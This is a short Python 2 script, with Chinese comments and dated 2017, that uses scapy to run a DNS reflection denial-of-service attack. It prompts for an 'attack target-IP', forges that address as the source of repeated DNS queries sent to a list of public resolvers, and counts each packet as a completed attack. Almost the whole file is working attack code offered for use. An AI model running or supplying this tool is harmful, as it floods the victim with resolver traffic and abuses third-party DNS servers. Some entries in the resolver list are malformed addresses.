#-*- coding:utf-8 -*-
#-----------------------------
#时间:2017,7,22
#版本：1.0
#----------------------------
import os
from scapy.all import *
os.system("reset")
sum = 0
time_how = int(raw_input("DNS服务器循环几遍？"))
x=raw_input("attack target-IP>")
zxw = 0
while zxw <= time_how:
	#DNS服务器列表
	dns_server_list = ["127.0.0.1","114.114.114.114","114.114.115.115","223.5.5.5","233.6.6.6","112.124.47","114.215.126.16","101,226.4.6","123.125.81.6","208.67.222.222","208.67.220.220","8.8.8.8","8.8.4.4"]
	#重置变量,防止出错
	dns_server=""
	zxw = zxw + 1
	for dns_server in dns_server_list:
		a = IP(dst=dns_server,src=x)
		b = UDP()
		c = DNS(id=1,rd=1,qdcount=1)
		c.qd = DNSQR(qname="www.baidu.com")
		p = a/b/c
		i = 0
		while i < 10 :
			send(p)
			sum = sum + 1
			print "第",sum,"次攻击已完成"
			i = i + 1
print u"attack over!"
time.sleep(2)
